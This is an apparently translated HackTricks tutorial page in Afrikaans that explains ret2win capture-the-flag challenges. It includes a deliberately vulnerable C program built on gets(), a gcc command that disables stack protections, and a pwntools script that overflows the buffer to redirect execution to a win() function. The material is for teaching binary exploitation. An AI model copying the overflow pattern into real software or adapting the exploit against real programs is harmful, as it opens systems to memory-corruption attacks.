# Ret2win

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

**Ret2win**-uitdagings is 'n gewilde kategorie in **Capture The Flag (CTF)**-kompetisies, veral in take wat **bin√™re uitbuiting** behels. Die doel is om 'n kwesbaarheid in 'n gegewe bin√™re l√™er uit te buit om 'n spesifieke, onaangeroepe funksie binne die bin√™re l√™er uit te voer, dikwels iets soos `win`, `ret2win`, ens. Hierdie funksie druk gewoonlik 'n vlag of 'n suksesboodskap uit wanneer dit uitgevoer word. Die uitdaging behels tipies die oorskrywing van die **terugkeeradres** op die stapel om die uitvoervloei na die gewenste funksie te stuur. Hier is 'n meer gedetailleerde verduideliking met voorbeelde:

### C-voorbeeld

Beskou 'n eenvoudige C-program met 'n kwesbaarheid en 'n `win`-funksie wat ons beoog om te roep:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Om hierdie program te kompileer sonder stapelbeskerming en met **ASLR** gedeaktiveer, kan jy die volgende bevel gebruik:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Kompileer die program as 'n 32-bis bin√™re (dit is opsioneel maar algemeen in CTF-uitdagings).
* `-fno-stack-protector`: Deaktiveer beskerming teen stoor oorvloei.
* `-z execstack`: Staan die uitvoering van kode op die stoor toe.
* `-no-pie`: Deaktiveer Posisioneel Onafhanklike Uitvoerbare om te verseker dat die adres van die `win`-funksie nie verander nie.
* `-o vulnerable`: Noem die uitvoer l√™er `vulnerable`.

### Python Uitbuiting met Pwntools

Vir die uitbuiting, sal ons **pwntools** gebruik, 'n kragtige CTF-raamwerk vir die skryf van uitbuitings. Die uitbuitingsskrip sal 'n lading skep om die buffer te oorvloei en die terugkeeradres met die adres van die `win`-funksie te oorskryf.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Om die adres van die `win` funksie te vind, kan jy **gdb**, **objdump**, of enige ander gereedskap gebruik wat jou in staat stel om bin√™re l√™ers te inspekteer. Byvoorbeeld, met `objdump`, kan jy die volgende gebruik:
```sh
objdump -d vulnerable | grep win
```
Hierdie bevel wys die samestelling van die `win`-funksie, insluitend sy beginadres.

Die Python-skrip stuur 'n sorgvuldig saamgestelde boodskap wat, wanneer verwerk deur die `vulnerable_function`, die buffer oorvloei en die terugkeeradres op die stapel oorskryf met die adres van `win`. Wanneer `vulnerable_function` terugkeer, spring dit na `win` in plaas daarvan om terug te keer na `main` of af te sluit, en die boodskap word gedruk.

## Beskermings

* **ASLR** moet gedeaktiveer word sodat die adres betroubaar is oor uitvoerings heen, anders sal die adres waar die funksie gestoor word nie altyd dieselfde wees nie en sal jy 'n lek benodig om uit te vind waar die `win`-funksie gelaai is.
* **Stapelkanaries** moet ook gedeaktiveer word, anders sal die gekompromitteerde EIP-terugkeeradres nooit gevolg word nie.

## Ander voorbeelde & Verwysings

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32-bis, geen ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64-bis met ASLR, met 'n lek van die bin-adres
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64-bis, geen ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32-bis, geen ASLR, dubbele klein oorvloei, eerste om die stapel te oorvloei en die grootte van die tweede oorvloei te vergroot
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32-bis, relro, geen kanarie, nx, geen pie, formaatstring om die adres `fflush` met die `win`-funksie te oorskryf (ret2win)
